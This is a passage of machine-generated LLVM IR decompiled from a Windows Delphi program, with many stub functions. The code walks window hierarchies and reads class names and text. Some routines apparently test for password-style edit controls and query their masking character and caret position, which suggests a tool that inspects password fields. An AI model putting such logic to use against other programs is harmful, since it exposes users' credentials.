  %13 = add i32 %arg1, 4, !insn.addr !1659
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1659
  %15 = load i32, i32* %14, align 4, !insn.addr !1659
  %16 = icmp eq i32 %15, %12, !insn.addr !1659
  %17 = icmp eq i1 %16, false, !insn.addr !1660
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1660
  br i1 %17, label %dec_label_pc_406eaf, label %dec_label_pc_406e49, !insn.addr !1660

dec_label_pc_406e49:                              ; preds = %dec_label_pc_406e3e
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1661
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1661
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1662
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1663
  %21 = load i32, i32* %20, align 4, !insn.addr !1663
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1664
  %23 = icmp eq i32 %21, %22, !insn.addr !1664
  %24 = icmp eq i1 %23, false, !insn.addr !1665
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1665
  br i1 %24, label %dec_label_pc_406eaf, label %dec_label_pc_406e5a, !insn.addr !1665

dec_label_pc_406e5a:                              ; preds = %dec_label_pc_406e49
  %25 = add i32 %arg1, 8, !insn.addr !1666
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1666
  %27 = load i32, i32* %26, align 4, !insn.addr !1666
  %28 = icmp eq i32 %27, 0, !insn.addr !1666
  br i1 %28, label %dec_label_pc_406e84, label %dec_label_pc_406e60, !insn.addr !1667

dec_label_pc_406e60:                              ; preds = %dec_label_pc_406e5a
  %29 = call i32 @function_406fd0(), !insn.addr !1668
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1669
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1670
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_406eaf

dec_label_pc_406e84:                              ; preds = %dec_label_pc_406e5a
  %32 = add i32 %arg1, 12, !insn.addr !1671
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1671
  %34 = load i32, i32* %33, align 4, !insn.addr !1671
  %35 = add i32 %arg1, 16, !insn.addr !1672
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1672
  %37 = load i32, i32* %36, align 4, !insn.addr !1672
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1673
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1673
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1673
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1673
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1673
  %43 = add i32 %arg1, 24, !insn.addr !1674
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1674
  store i32 %42, i32* %44, align 4, !insn.addr !1674
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1675
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1675
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1676
  %47 = icmp eq i1 %46, false, !insn.addr !1677
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1678
  br i1 %47, label %dec_label_pc_406eaf, label %dec_label_pc_406eaa, !insn.addr !1678

dec_label_pc_406eaa:                              ; preds = %dec_label_pc_406e84
  %48 = add i32 %arg1, 20, !insn.addr !1679
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1679
  store i32 %arg2, i32* %49, align 4, !insn.addr !1679
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1680
  br label %dec_label_pc_406eaf, !insn.addr !1680

dec_label_pc_406eaf:                              ; preds = %dec_label_pc_406e60, %dec_label_pc_406eaa, %dec_label_pc_406e84, %dec_label_pc_406e49, %dec_label_pc_406e3e, %dec_label_pc_406e2f, %dec_label_pc_406df8
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1681
  %51 = load i32, i32* %50, align 4, !insn.addr !1681
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1682
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1683
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1683
  store i32 4222673, i32* %53, align 4, !insn.addr !1683
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1684
  ret i32 %54, !insn.addr !1685
}

define i32 @function_406eca() local_unnamed_addr {
dec_label_pc_406eca:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1686
  ret i32 %0, !insn.addr !1686
}

define i32 @function_406ecf() local_unnamed_addr {
dec_label_pc_406ecf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1687
}

define i32 @function_406ed1(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406ed1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1688
}

define i32 @function_406edc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406edc:
  %esp.0.reg2mem = alloca i32, !insn.addr !1689
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1690
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1691
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1691
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1691
  %6 = call i32 @function_40441c(), !insn.addr !1692
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1693
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1694
  br label %dec_label_pc_406f20, !insn.addr !1694

dec_label_pc_406f20:                              ; preds = %dec_label_pc_406f3f, %dec_label_pc_406edc
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1693
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1693
  store i32 %7, i32* %9, align 4, !insn.addr !1693
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1695
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1695
  store i32 4222456, i32* %11, align 4, !insn.addr !1695
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1696
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1697
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1697
  store i32 1, i32* %14, align 4, !insn.addr !1697
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1698
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1699
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1699
  store i32 0, i32* %16, align 4, !insn.addr !1699
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1700
  %18 = icmp eq i1 %17, false, !insn.addr !1701
  %19 = icmp eq i1 %18, false, !insn.addr !1702
  br i1 %19, label %dec_label_pc_406f4a, label %dec_label_pc_406f3f, !insn.addr !1702

dec_label_pc_406f3f:                              ; preds = %dec_label_pc_406f20
  %20 = call i32 @function_40441c(), !insn.addr !1703
  %21 = sub i32 %20, %6, !insn.addr !1704
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1705
  %23 = icmp eq i1 %22, false, !insn.addr !1706
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1706
  br i1 %23, label %dec_label_pc_406f20, label %dec_label_pc_406f4a, !insn.addr !1706

dec_label_pc_406f4a:                              ; preds = %dec_label_pc_406f3f, %dec_label_pc_406f20
  ret i32 0, !insn.addr !1707
}

define i32 @function_406f64() local_unnamed_addr {
dec_label_pc_406f64:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1708
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1709
}

define i32 @function_406f7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_406f7c:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1710
  %edi.0.reg2mem = alloca i32, !insn.addr !1710
  %ecx.0.reg2mem = alloca i32, !insn.addr !1710
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1711
  br label %2, !insn.addr !1711

; <label>:2:                                      ; preds = %4, %dec_label_pc_406f7c
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1711
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1711
  br i1 %3, label %10, label %4, !insn.addr !1711

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1711
  %6 = load i8, i8* %5, align 1, !insn.addr !1711
  %7 = icmp eq i8 %6, 0, !insn.addr !1711
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1711
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1711
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1711
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1711
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1711
  br i1 %7, label %10, label %2, !insn.addr !1711

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1712
  ret i32 %11, !insn.addr !1713
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_406fd0() local_unnamed_addr {
dec_label_pc_406fd0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1714
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1715
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1715
  %4 = add i32 %3, %1, !insn.addr !1716
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1716
  store i8 0, i8* %5, align 1, !insn.addr !1716
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1717
  ret i32 %6, !insn.addr !1718
}

define i32 @function_407004() local_unnamed_addr {
dec_label_pc_407004:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1719
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1720
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1721
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1721
  %6 = add i32 %5, %3, !insn.addr !1722
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1722
  store i8 0, i8* %7, align 1, !insn.addr !1722
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1723
  ret i32 %8, !insn.addr !1724
}

define i32 @function_40703c() local_unnamed_addr {
dec_label_pc_40703c:
  %0 = call i32 @function_4034c8(), !insn.addr !1725
  %1 = call i32 @function_4034c8(), !insn.addr !1726
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1727
  ret i32 %2, !insn.addr !1728
}

define i32 @function_40707c() local_unnamed_addr {
dec_label_pc_40707c:
  %0 = call i32 @function_4034c8(), !insn.addr !1729
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1730
  ret i32 %1, !insn.addr !1731
}

define i32 @function_4070b4() local_unnamed_addr {
dec_label_pc_4070b4:
  %0 = call i32 @function_4036c8(), !insn.addr !1732
  %1 = call i32 @function_4036c8(), !insn.addr !1733
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1734
  %3 = icmp eq i32 %2, 2, !insn.addr !1735
  %4 = zext i1 %3 to i32, !insn.addr !1736
  %5 = and i32 %2, -256, !insn.addr !1736
  %6 = or i32 %5, %4, !insn.addr !1736
  ret i32 %6, !insn.addr !1737
}

define i32 @function_4070e4() local_unnamed_addr {
dec_label_pc_4070e4:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1738
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1738
  %esp.02.reg2mem = alloca i32, !insn.addr !1738
  %storemerge3.reg2mem = alloca i32, !insn.addr !1738
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1739
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1739
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1739
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1740
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1741
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1742
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1742
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1743
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1743
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1743
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1744
  %9 = icmp eq i1 %8, false, !insn.addr !1745
  %10 = icmp eq i1 %9, false, !insn.addr !1746
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1746
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1746
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1746
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1746
  br i1 %10, label %dec_label_pc_407108, label %dec_label_pc_407148, !insn.addr !1746

dec_label_pc_407108:                              ; preds = %dec_label_pc_4070e4, %dec_label_pc_407108
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_406fd0(), !insn.addr !1747
  %12 = call i32 @function_4070e4(), !insn.addr !1748
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1749
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1749
  store i32 2, i32* %14, align 4, !insn.addr !1749
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1750
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1750
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1750
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1751
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1743
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1743
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1744
  %21 = icmp eq i1 %20, false, !insn.addr !1745
  %22 = icmp eq i1 %21, false, !insn.addr !1746
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1746
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1746
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1746
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1746
  br i1 %22, label %dec_label_pc_407108, label %dec_label_pc_407148, !insn.addr !1746

dec_label_pc_407148:                              ; preds = %dec_label_pc_407108, %dec_label_pc_4070e4
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1752
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1753
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1754
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1754
  store i32 4223333, i32* %25, align 4, !insn.addr !1754
  %26 = call i32 @"@LStrClr"(), !insn.addr !1755
  ret i32 %26, !insn.addr !1756
}

define i32 @function_40715e() local_unnamed_addr {
dec_label_pc_40715e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1757
  ret i32 %0, !insn.addr !1757
}

define i32 @function_407163() local_unnamed_addr {
dec_label_pc_407163:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1758
}

define i32 @function_407165(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407165:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1759
}

define i32 @function_407170() local_unnamed_addr {
dec_label_pc_407170:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1760
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1760
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1760
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1761
  %2 = call i32 @function_407004(), !insn.addr !1762
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1763
  %4 = call i32 @function_4070e4(), !insn.addr !1764
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1765
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1766
  %6 = call i32 @"@LStrClr"(), !insn.addr !1767
  ret i32 %6, !insn.addr !1768
}

define i32 @function_4071d1() local_unnamed_addr {
dec_label_pc_4071d1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1769
  ret i32 %0, !insn.addr !1769
}

define i32 @function_4071d6() local_unnamed_addr {
dec_label_pc_4071d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1770
}

define i32 @function_4071d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4071d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1771
}

define i32 @function_4071f3() local_unnamed_addr {
dec_label_pc_4071f3:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1772
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1772
  store i32 %3, i32* %4, align 4, !insn.addr !1772
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1773
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1773
  %9 = add i8 %6, %8, !insn.addr !1773
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1773
  store i8 %9, i8* %10, align 1, !insn.addr !1773
  %11 = add i32 %2, 81, !insn.addr !1774
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1774
  %13 = load i8, i8* %12, align 1, !insn.addr !1774
  %14 = trunc i32 %1 to i8, !insn.addr !1774
  %15 = add i8 %13, %14, !insn.addr !1774
  store i8 %15, i8* %12, align 1, !insn.addr !1774
  %16 = load i32, i32* %eax, align 4, !insn.addr !1775
  ret i32 %16, !insn.addr !1775
}

define x86_fp80 @function_4071fb() local_unnamed_addr {
dec_label_pc_4071fb:
  %0 = call x86_fp80 @__decompiler_undefined_function_8()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1776
  ret x86_fp80 %1, !insn.addr !1777
}

define i32 @function_407200() local_unnamed_addr {
dec_label_pc_407200:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1778
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1779
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1779
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1779
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1780
  %3 = call i32 @function_407004(), !insn.addr !1781
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1782
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1783
  %6 = icmp eq i32 %5, 180, !insn.addr !1784
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1785
  br i1 %6, label %dec_label_pc_407263, label %dec_label_pc_40723e, !insn.addr !1785

dec_label_pc_40723e:                              ; preds = %dec_label_pc_407200
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1786
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1787
  %10 = icmp eq i1 %9, false, !insn.addr !1788
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1788
  br i1 %10, label %dec_label_pc_407263, label %dec_label_pc_40724a, !insn.addr !1788

dec_label_pc_40724a:                              ; preds = %dec_label_pc_40723e
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1789
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_407263

dec_label_pc_407263:                              ; preds = %dec_label_pc_40724a, %dec_label_pc_407200, %dec_label_pc_40723e
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1790
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1791
  %13 = add i32 %esp.1, 8, !insn.addr !1792
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1792
  store i32 4223622, i32* %14, align 4, !insn.addr !1792
  %15 = call i32 @"@LStrClr"(), !insn.addr !1793
  ret i32 %15, !insn.addr !1794
}

define i32 @function_40727f() local_unnamed_addr {
dec_label_pc_40727f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1795
  ret i32 %0, !insn.addr !1795
}

define i32 @function_407284() local_unnamed_addr {
dec_label_pc_407284:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1796
}

define i32 @function_407286(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407286:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1797
}

define i32 @function_40729c() local_unnamed_addr {
dec_label_pc_40729c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1798
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1798
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1798
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1799
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1800
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1800
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1801
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1802
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1803
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1804
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1804
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1805
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1806
  %16 = ashr i32 %15, 31, !insn.addr !1807
  %17 = zext i32 %15 to i64, !insn.addr !1808
  %18 = zext i32 %16 to i64, !insn.addr !1808
  %19 = mul i64 %18, 4294967296, !insn.addr !1808
  %20 = or i64 %19, %17, !insn.addr !1808
  %21 = zext i32 %4 to i64, !insn.addr !1808
  %22 = sdiv i64 %20, %21, !insn.addr !1808
  %23 = trunc i64 %22 to i32, !insn.addr !1808
  ret i32 %23, !insn.addr !1809
}

define i32 @function_4072f8() local_unnamed_addr {
dec_label_pc_4072f8:
  %esp.0.reg2mem = alloca i32, !insn.addr !1810
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1811
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1811
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1811
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1812
  %2 = load i32*, i32** @global_var_408158, align 4, !insn.addr !1813
  %3 = icmp eq i32* %2, null, !insn.addr !1813
  br i1 %3, label %dec_label_pc_407334, label %dec_label_pc_407321, !insn.addr !1814

dec_label_pc_407321:                              ; preds = %dec_label_pc_4072f8
  store i32 0, i32* %2, align 4, !insn.addr !1815
  %4 = call i32 @function_4066c0(), !insn.addr !1816
  br label %dec_label_pc_407334, !insn.addr !1816

dec_label_pc_407334:                              ; preds = %dec_label_pc_407321, %dec_label_pc_4072f8
  %5 = load i32, i32* @global_var_408140, align 4, !insn.addr !1817
  %6 = icmp eq i32 %5, 0, !insn.addr !1817
  br i1 %6, label %dec_label_pc_407348, label %dec_label_pc_40733e, !insn.addr !1818

dec_label_pc_40733e:                              ; preds = %dec_label_pc_407334
  %7 = load i32*, i32** @global_var_408144, align 4, !insn.addr !1819
  %8 = icmp eq i32* %7, null, !insn.addr !1819
  %9 = icmp eq i1 %8, false, !insn.addr !1820
  br i1 %9, label %dec_label_pc_407352, label %dec_label_pc_407348, !insn.addr !1820

dec_label_pc_407348:                              ; preds = %dec_label_pc_40733e, %dec_label_pc_407334
  %10 = call i32 @function_40742c(), !insn.addr !1821
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1822
  br label %dec_label_pc_4073ef, !insn.addr !1822

dec_label_pc_407352:                              ; preds = %dec_label_pc_40733e
  %11 = load i8, i8* bitcast (i32** @global_var_408168 to i8*), align 4, !insn.addr !1823
  %12 = icmp eq i8 %11, 0, !insn.addr !1823
  br i1 %12, label %dec_label_pc_40737b, label %dec_label_pc_40735c, !insn.addr !1824

dec_label_pc_40735c:                              ; preds = %dec_label_pc_407352
  %13 = call i32 @function_406c14(), !insn.addr !1825
  %14 = icmp eq i32 %13, 0, !insn.addr !1826
  br i1 %14, label %dec_label_pc_40737b, label %dec_label_pc_407374, !insn.addr !1827

dec_label_pc_407374:                              ; preds = %dec_label_pc_40735c
  %15 = call i32 @function_40742c(), !insn.addr !1828
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1829
  br label %dec_label_pc_4073ef, !insn.addr !1829

dec_label_pc_40737b:                              ; preds = %dec_label_pc_40735c, %dec_label_pc_407352
  %16 = call i32 @"@LStrCatN"(), !insn.addr !1830
  %17 = call i32 @"@LStrAsg"(), !insn.addr !1831
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 3 to i32 (i32*)*), i32* inttoptr (i32 4216780 to i32*), i32 0, i32* null), !insn.addr !1832
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4216780 to i32*), i32 0, i32* null), !insn.addr !1833
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1834
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1834
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4216780 to i32*), i32 0, i32* null), !insn.addr !1835
  %23 = call i32 @function_40742c(), !insn.addr !1836
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !1836
  br label %dec_label_pc_4073ef, !insn.addr !1836

dec_label_pc_4073ef:                              ; preds = %dec_label_pc_40737b, %dec_label_pc_407374, %dec_label_pc_407348
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1837
  %25 = load i32, i32* %24, align 4, !insn.addr !1837
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1838
  %26 = add i32 %esp.0.reload, 8, !insn.addr !1839
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1839
  store i32 4224012, i32* %27, align 4, !insn.addr !1839
  %28 = call i32 @"@LStrClr"(), !insn.addr !1840
  ret i32 %28, !insn.addr !1841
}

define i32 @function_407405() local_unnamed_addr {
dec_label_pc_407405:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1842
  ret i32 %0, !insn.addr !1842
}

define i32 @function_40740a() local_unnamed_addr {
dec_label_pc_40740a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1843
}

define i32 @function_40740c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_40740c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1844
}

